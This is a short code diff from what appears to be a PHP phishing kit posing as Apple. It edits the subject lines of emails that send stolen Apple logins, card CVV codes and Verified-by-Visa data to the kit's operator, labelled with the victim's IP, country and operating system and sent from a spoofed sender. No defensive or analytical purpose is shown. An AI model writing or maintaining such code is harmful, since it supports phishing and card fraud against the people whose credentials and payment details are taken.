@@ -168,7 +168,7 @@ $message = "
     </div>
 </div><br>";
 
-        $subject = "=?utf-8?B?4p2k?= NEW APPL LOGIN  =?utf-8?B?4p2k?= [ $ip2 - $cn | $os ] ";
+        $subject = "NEW APPL LOGIN [ $ip2 - $cn | $os ] ";
         $head = "MIME-Version: 1.0" . "\r\n";
         $head .= "Content-type:text/html;charset=UTF-8" . "\r\n";
         $head .= "From: APP-SMART" . "\r\n";
@@ -445,7 +445,7 @@ $message = "
     </div>
 </div><br>";
 
-        $subject = "=?utf-8?B?4p2k?= S3XY APPL CCV =?utf-8?B?4p2k?= [ $ip2 - $cn | $os ]";
+        $subject = "APPL CCV [ $ip2 - $cn | $os ]";
         $head = "MIME-Version: 1.0" . "\r\n";
         $head .= "Content-type:text/html;charset=UTF-8" . "\r\n";
         $head .= "From: APP-SMART" . "\r\n";
@@ -682,7 +682,7 @@ $message = "
     </div>
 </div><br>";
 
-        $subject = "=?utf-8?B?4p2k?=  VBV  =?utf-8?B?4p2k?=  [ $ip2 - $cn | $os ] ";
+        $subject = "VBV [ $ip2 - $cn | $os ] ";
         $head = "MIME-Version: 1.0" . "\r\n";
         $head .= "Content-type:text/html;charset=UTF-8" . "\r\n";
         $head .= "From: APP-SMART" . "\r\n";
